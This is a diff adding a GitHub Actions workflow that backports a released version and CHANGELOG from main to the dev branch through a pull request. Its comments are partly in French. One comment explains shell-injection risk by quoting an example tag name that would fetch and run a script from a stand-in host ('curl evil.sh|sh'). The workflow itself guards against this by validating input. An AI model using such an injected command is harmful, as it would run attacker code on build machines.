@@ -1,0 +1,133 @@
+name: Version backport
+
+# Carries a release back down to the dev line (#288).
+#
+# The SemVer bump lives in the dev → main promotion PR, so release commits exist
+# only on `main`. Nothing brought them back: in July `main` shipped 1.3.0 while
+# `dev` still said 1.1.3, and the beta advertised an older version than
+# production. Publishing a `v*` tag now opens the backport PR by itself.
+#
+# It opens a PR rather than pushing: `dev` is protected, and the CHANGELOG merge
+# deserves a human read before landing.
+on:
+  push:
+    tags:
+      - "v*"
+  workflow_dispatch:
+    inputs:
+      version:
+        description: "Version publiée (ex. 1.5.0) — pour rejouer une redescente oubliée"
+        required: true
+
+permissions:
+  contents: write
+  pull-requests: write
+
+jobs:
+  backport:
+    name: Ouvrir la PR de redescente vers dev
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: dev
+          fetch-depth: 0
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+
+      # The tag name and the dispatch input are attacker-controllable text, so
+      # they reach the shell as env vars rather than being interpolated into it:
+      # a `${{ }}` is substituted before the shell runs, and a tag named
+      # `v1.0.0$(curl evil.sh|sh)` would execute on the runner.
+      #
+      # The value is then validated against a strict SemVer shape — anything
+      # else stops the workflow instead of flowing into later steps.
+      - name: Resolve released version
+        id: released
+        env:
+          RAW_VERSION: ${{ github.event.inputs.version || github.ref_name }}
+        run: |
+          VERSION="${RAW_VERSION#v}"
+          if ! printf '%s' "$VERSION" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+$'; then
+            echo "Version « $VERSION » non conforme (attendu vX.Y.Z)." >&2
+            exit 1
+          fi
+          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
+
+      # The released CHANGELOG section lives only on `main`; take that file
+      # wholesale rather than replaying the edit — it is the published text.
+      - name: Bring the released CHANGELOG down
+        run: |
+          git fetch origin main --depth=1
+          git checkout origin/main -- CHANGELOG.md
+
+      - name: Move the dev line to the next -beta
+        id: bump
+        env:
+          RELEASED: ${{ steps.released.outputs.version }}
+        run: echo "next=$(node scripts/bump-beta-version.mjs "$RELEASED")" >> "$GITHUB_OUTPUT"
+
+      - name: Verify the result holds the invariant
+        run: node scripts/check-version-consistency.mjs --against-main
+
+      # Plain `gh`, already installed on GitHub runners, rather than a
+      # third-party action: this workflow runs with write access, and the whole
+      # behaviour stays readable in this repository.
+      #
+      # Idempotent by hand: re-running force-pushes the branch and reuses the
+      # open PR instead of opening a second one.
+      - name: Open the pull request
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          RELEASED: ${{ steps.released.outputs.version }}
+          NEXT: ${{ steps.bump.outputs.next }}
+        run: |
+          set -euo pipefail
+          BRANCH="chore/backport-version-$NEXT"
+
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+
+          # Nothing to carry down: the backport already landed.
+          if git diff --quiet; then
+            echo "La ligne dev est déjà sur $NEXT — rien à faire."
+            exit 0
+          fi
+
+          git checkout -b "$BRANCH"
+          git add CHANGELOG.md src/backend/src/lib/version.ts src/backend/package.json src/frontend/package.json
+          git commit --file - <<EOF
+          chore(version): backport $RELEASED, carry $NEXT on dev
+
+          The release bump and CHANGELOG entry live only on main (the promotion
+          PR is squashed), so dev would keep advertising an older version than
+          production — the drift described in #288.
+
+          Refs #288
+          EOF
+          git push --force origin "$BRANCH"
+
+          if gh pr view "$BRANCH" --json number >/dev/null 2>&1; then
+            echo "PR déjà ouverte pour $BRANCH — mise à jour par le push."
+            exit 0
+          fi
+
+          gh pr create \
+            --base dev \
+            --head "$BRANCH" \
+            --title "chore(version): redescente $RELEASED + ligne dev en $NEXT" \
+            --label infra \
+            --body "$(cat <<EOF
+          Redescente automatique après la publication du tag \`v$RELEASED\` (#288).
+
+          - **CHANGELOG.md** : reprise de la section publiée sur \`main\`.
+          - **Version** : ligne \`dev\` positionnée sur **\`$NEXT\`** dans les 3 emplacements (\`version.ts\`, \`src/backend/package.json\`, \`src/frontend/package.json\`).
+
+          > Le bump proposé est un **patch**. Si le prochain périmètre est une fonctionnalité ou une rupture, ajustez le numéro avant de merger (\`1.x.0-beta\` / \`2.0.0-beta\`) — cf. \`docs/mise-en-production.md\`, étape 1.
+
+          Sans cette redescente, la bêta annoncerait une version antérieure à la production et le badge de l'admin deviendrait trompeur.
+
+          Refs #288
+          EOF
+          )"
